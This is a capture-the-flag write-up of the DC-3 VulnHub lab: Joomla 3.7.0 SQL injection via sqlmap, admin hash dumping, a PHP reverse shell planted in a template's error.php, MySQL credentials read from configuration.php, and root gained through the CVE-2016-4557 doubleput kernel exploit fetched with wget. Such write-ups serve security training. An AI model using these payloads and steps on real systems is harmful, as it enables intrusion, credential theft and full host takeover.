# DC-3 VulnHub Challenge Writeup

## Overview

DC-3 is a VulnHub machine that involves exploiting a SQL injection vulnerability in a Joomla CMS to gain an initial foothold, followed by leveraging a kernel exploit to achieve root access and retrieve the final flag.

## Reconnaissance

### Network Scanning

I began by identifying the target machine on the network using `netdiscover`:

```shellscript
netdiscover -r 192.168.1.0/24
```

The target was found at `192.168.1.19`.

Next, I performed a comprehensive port scan using `nmap` to identify open services and their versions:

```shellscript
nmap -sS -sV -Pn --min-rate=1000 --max-retries=2 192.168.1.19 -p-
```

The scan revealed that **port 80/tcp** was open, running `Apache httpd 2.4.18 ((Ubuntu))`.

### Web Enumeration

With the web server identified, I used `gobuster` to enumerate directories:

```shellscript
gobuster dir -u http://192.168.1.19/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

Notable directories included `/administrator`, `/components`, `/images`, `/media`, and `/tmp`.

I then used `curl` to inspect the `/administrator` directory:

```shellscript
curl http://192.168.1.19/administrator/
```

The HTML source indicated the presence of **Joomla! - Open Source Content Management** and the title "DC-3 - Administration".

### Joomla Version and Vulnerability Identification

To pinpoint the Joomla version and potential vulnerabilities, I ran `joomscan`:

```shellscript
joomscan -u http://192.168.1.19
```

`joomscan` identified the Joomla version as **3.7.0** and noted directory listing was enabled for several components. It also flagged `com_biblestudy` with references to SQL Injection exploits.

A `searchsploit` query for Joomla 3.7.0 confirmed a relevant SQL Injection vulnerability:

```shellscript
searchsploit joomla 3.7.0
```

The most promising exploit was `Joomla! 3.7.0 - 'com_fields' SQL Injection` (`php/webapps/42033.txt`).

## Initial Foothold (SQL Injection & Web Shell)

### Exploiting `com_fields`SQL Injection

I reviewed the `42033.txt` exploit, which detailed a SQL injection vulnerability in the `list[fullordering]` GET parameter of the `com_fields` component. I used `sqlmap` to enumerate databases:

```shellscript
sqlmap -u "http://192.168.1.19/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```

`sqlmap` confirmed the vulnerability and listed the following databases: `information_schema`, `joomladb`, `mysql`, `performance_schema`, and `sys`. The `joomladb` was the target.

Next, I enumerated tables within `joomladb`:

```shellscript
sqlmap -u "http://192.168.1.19/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --tables -D joomladb -p list[fullordering]
```

The `#__users` table was identified as containing user information. I proceeded to dump the `username` and `password` columns:

```shellscript
sqlmap -u "http://192.168.1.19/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --random-agent -p list[fullordering] -D joomladb -T "#__users" -C "username,password" --dump --threads=1 --hex --fresh-queries
```

This successfully dumped the following credentials:

| username | password
|-----|-----
| admin | `$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu`


The `admin` username and its bcrypt hash were retrieved.

### Gaining `www-data`Shell via Joomla Template Editor

With the `admin` credentials, I logged into the Joomla administrator panel at `http://192.168.1.19/administrator/`.

<img width="1366" height="683" alt="image" src="https://github.com/user-attachments/assets/f9b7fb65-9ba2-450b-9e3a-a4fe171643b9" />


From the control panel, I navigated to **Extensions > Templates > Templates** and selected the `protostar` template. I then edited the `error.php` file. Inside `error.php`, I injected a PHP reverse shell payload.

<img width="1366" height="682" alt="image" src="https://github.com/user-attachments/assets/2aaf1560-8af6-4a1a-a0f4-6c402f8c5f01" />



The injected payload was:

```php
<?php system("bash -c 'bash -i >& /dev/tcp/192.168.1.5/4444 0>&1'"); ?>
```

Before triggering the shell, I set up a `netcat` listener on my attacking machine (192.168.1.5) on port 4444:

```shellscript
nc -lnvp 4444
```

After saving the modified `error.php`, I triggered the reverse shell by navigating to a non-existent page on the Joomla site (e.g., `http://192.168.1.19/nonexistentpage`). This executed the `error.php` file, and my `netcat` listener caught the connection:

```shellscript
Connection received on 192.168.1.19 60480
bash: cannot set terminal process group (1201): Inappropriate ioctl for device
bash: no job control in this shell
www-data@DC-3:/var/www/html$
```

I then upgraded to a fully interactive TTY shell:

```shellscript
python3 -c "import pty;pty.spawn('/bin/bash')"
```

## Privilege Escalation

### Initial Enumeration as `www-data`

As `www-data`, I started enumerating the system. I checked the `configuration.php` file in the web root, which often contains database credentials:

```shellscript
www-data@DC-3:/var/www/html$ cat configuration.php
```

This file contained the MySQL root credentials:

```php
public $user = 'root';
public $password = 'squires';
public $db = 'joomladb';
```

I used these credentials to log into the MySQL server:

```shellscript
www-data@DC-3:/var/www/html$ mysql -u root -p
Enter password: squires
```

I successfully logged in as the MySQL `root` user. While this gave me full control over the database, it was not yet root on the operating system.

I also checked the `/home` directory and found a user named `dc3`. Attempts to `cat .bash_history` or `su dc3` with various passwords (including `squires`) were unsuccessful.

### Identifying Kernel Vulnerability

I uploaded and ran `linpeas.sh` to perform a comprehensive privilege escalation enumeration:

```shellscript
wget http://192.168.1.5/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

`linpeas.sh` identified the kernel version as `Linux version 4.4.0-21-generic`. It highlighted several potential kernel exploits, with `[CVE-2016-4557] double-fdput()` being a highly probable candidate for this specific kernel version.

### Exploiting `double-fdput()`(CVE-2016-4557) for Root

I attempted to use the `decr.c` and `pwn.c` exploit pair (from `40053.zip`), but they failed to execute correctly, indicating that the `ip_tables` module was not loaded or other conditions were not met.

Based on the `linpeas.sh` output and `searchsploit` results, I then focused on the `double-fdput()` exploit (CVE-2016-4557), specifically the `ebpf_mapfd_doubleput_exploit` from `39772.zip`. I downloaded the necessary files (`compile.sh`, `doubleput.c`, `hello.c`, `suidhelper.c`) to the `/tmp` directory on the target machine using `wget` from my attacking machine's HTTP server.
<img width="1103" height="644" alt="image" src="https://github.com/user-attachments/assets/be433077-ac16-4da4-bec7-fce42fa6b547" />


```shellscript
wget http://192.168.1.5/compile.sh
wget http://192.168.1.5/doubleput.c
wget http://192.168.1.5/hello.c
wget http://192.168.1.5/suidhelper.c
chmod +x compile.sh
./compile.sh
```

The `compile.sh` script successfully compiled `doubleput.c` into an executable named `doubleput`.

Finally, I executed the compiled exploit:

```shellscript
./doubleput
```

The exploit ran successfully, and after a short period, it launched a root shell:

```shellscript
starting writev
woohoo, got pointer reuse
writev returned successfully. if this worked, you'll have a root shell in <=60 seconds.
suid file detected, launching rootshell...
we have root privs now...
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```



The `uid=0(root)` confirmed that I had successfully gained root access on the system.

## Root Flag

With root privileges, I navigated to the `/root` directory to find the final flag:

```shellscript
cd /root
ls
cat the-flag.txt
```

The content of `the-flag.txt` was:

```plaintext
__        __   _ _   ____                   _ _ _ _
\ \      / /__| | | |  _ \  ___  _ __   ___| | | | |
 \ \ /\ / / _ \ | | | | | |/ _ \| '_ \ / _ \ | | | |
  \ V  V /  __/ | | | |_| | (_) | | | |  __/_|_|_|_|
   \_/\_/ \___|_|_| |____/ \___/|_| |_|\___(_|_|_|_)

Congratulations are in order.  :-)
I hope you've enjoyed this challenge as I enjoyed making it.
If there are any ways that I can improve these little challenges,
please let me know.
As per usual, comments and complaints can be sent via Twitter to @DCAU7
Have a great day!!!!
```

## Conclusion

The DC-3 challenge provided a practical scenario involving web application exploitation and kernel privilege escalation. The initial compromise was achieved by exploiting a SQL injection vulnerability in Joomla 3.7.0 to extract administrator credentials. These credentials were then used to gain access to the Joomla admin panel, where a reverse shell was injected into a template file. This provided a `www-data` shell. Further enumeration revealed MySQL root credentials, but the ultimate system root access was gained by identifying and successfully exploiting the `double-fdput()` (CVE-2016-4557) kernel vulnerability.

## Tools Used

- `netdiscover`
- `nmap`
- `gobuster`
- `curl`
- `joomscan`
- `searchsploit`
- `sqlmap`
- `netcat`
- `python3`
- `mysql`
- `linpeas.sh`
- `gcc`
- `doubleput` (CVE-2016-4557 exploit)

